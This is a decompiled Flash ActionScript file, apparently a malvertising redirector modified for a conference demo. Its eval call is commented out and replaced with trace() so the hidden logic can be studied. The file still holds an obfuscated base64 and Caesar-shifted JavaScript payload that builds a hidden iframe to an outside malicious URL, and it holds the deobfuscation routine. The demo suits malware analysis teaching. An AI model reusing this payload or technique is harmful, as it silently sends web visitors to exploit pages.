package
{
   import flash.display.MovieClip;
   import flash.external.ExternalInterface;
   import flash.events.Event;
   
   public class zjxjpdbmsp extends MovieClip
   {
       
      public function zjxjpdbmsp()
      {
         super();
		 //debug
		 this.go();
         //if(stage)
         //{
            //this.go();
         //}
         //else
         //{
            //addEventListener(Event.ADDED_TO_STAGE,this.go);
         //}
      }
      
      public function de(param1:String, param2:int) : String
      {
         var _loc14_:String = "fromCharCode";
         var _loc15_:String = new String();
         var _loc16_:* = 0;
         while(_loc16_ < param1.length)
         {
            _loc15_ = _loc15_ + String[_loc14_](cca(param1,_loc16_) - param2);
            _loc16_++;
         }
         return _loc15_;
      }
      
      public function cca(param1:String, param2:Number) : int
      {
         return param1.charCodeAt(param2);
      }
      
      public function ej(param1:String, param2:String) : String
      {
         var _loc10_:* = null;
         if(ExternalInterface.available)
         {
            _loc10_ = "call";
            return ExternalInterface[_loc10_](param2,param1);
         }
         return "";
      }
      
      private function gourl() : String
      {
         //http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#url
	     //return root.loaderInfo.url;
		 return "http://hemmox.xyz/hskyrktkffn-0eecfe1krmo3nmnep-nte1trfcipblpkm-b3c7oaafa-f3a1c6mbr-pnkr-m7i5s-dfnaellsbfsrc-1pkfl7amd6m3lr9f8eenl9ra4pkasa9nddlbe7in0ab-omkaofbp8r4bbacd9f1pkm4d9sepm/";
      }
      
	  // Function responsible for calling ej() to execute the deobfuscated JS
      private function go(param1:Event = null) : void
      {
          /*DEBUG: The following call to ej() is what makes the magic happen.
		   * Each call to da() produces some JS. The JS is pushed to ej(), which
		   * basically runs: ExternalInterface[call]("eval",[actual JS code]);
		   */
		  //ej(this.da(1) + gourl() + this.da(2),this.da(3));  <-- Let's just use trace()
		  trace("Hiya BSLV16 folks! Let's see how this Flash redirect works!");
		  trace(this.da(1));
		  trace(gourl());
		  trace(this.da(2));
		  trace(this.da(3));
		  trace('ktxbai');
      }
      
      public function hr(param1:String) : String
      {
         var _loc18_:uqmhcsrux = new uqmhcsrux();
         addChild(_loc18_);
         return de(_loc18_.decode(param1),3);
      }
      
      public function da(param1:Number) : String
      {
         var _loc10_:String = this.hr("bXNudWlzeGVza3JkaW9vanh3aXJnfXJ1fXtsbGVqaGtnd3psfGlpaGptfHJ4fHdpbHUndmh3V2xwaHJ4dytpeHFmd2xycSssfiN5ZHUjZyNAI2dyZnhwaHF3MWZ1aGR3aEhvaHBocXcrKmdseSosPiN5ZHUjeGRAcWR5bGpkd3J1MXh2aHVEamhxdzF3ck9yemh1RmR2aCssPiNsaSMrK3hkMWxxZ2h7UmkrKnB2bGgqLCRAIzA0LCN/fyMreGQxbHFnaHtSaSsqdXk9NDQqLCRAIzA0LCwjfiN5ZHUjZHV1I0AjXiprd3BvKi8qa3dwKi8qbXNoaiovKnNxaiovKm1zaiovKmpsaSovKm12KmA+I3lkdSNuaHxvbHZ3QCpkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fSo+I3lkdSN3aHBzQCoqPiN5ZHUjdWRxZyNAI1Bkd2sxaW9ycnUrUGR3azF1ZHFncnArLCMtI2R1dTFvaHFqd2ssPiN3aHBzQCoqPiNzb2hxandrQFBkd2sxaW9ycnUrUGR3azF1ZHFncnArLCMtIys0MyMwIzYjLiM0LCwjLiM2PiNpcnUjK2xAMz5sP3NvaHFqd2s+bC4uLCN3aHBzLkBuaHxvbHZ3MWZrZHVEdytQZHdrMWlvcnJ1K1Bkd2sxdWRxZ3JwKywtbmh8b2x2dzFvaHFqd2ssLD4jd2hwcy5AKjEqLmR1dV51ZHFnYD4jZzFsZ0AqZnJ4cXdodWJ5ZG94aCo+ZzF2d3xvaDFzcnZsd2xycSNAIypkZXZyb3h3aCo+ZzF2d3xvaDFvaGl3I0AjKjozM3N7Kj5nMXZ3fG9oMXdycyNAIyowNDMzM3N7Kj5nMWxxcWh1S1dQTyNAIyo/bGl1ZHBoI3Z1ZkAlJyoud2hwcy4qJUE/MmxpdWRwaEEqPiNncmZ4cGhxdzFlcmd8MWRzc2hxZ0ZrbG9nK2csPiOAgC84OCw+J2h5ZG8=");
         var _loc11_:Array = _loc10_.split("$");
         return _loc11_[param1];
      }
   }
}
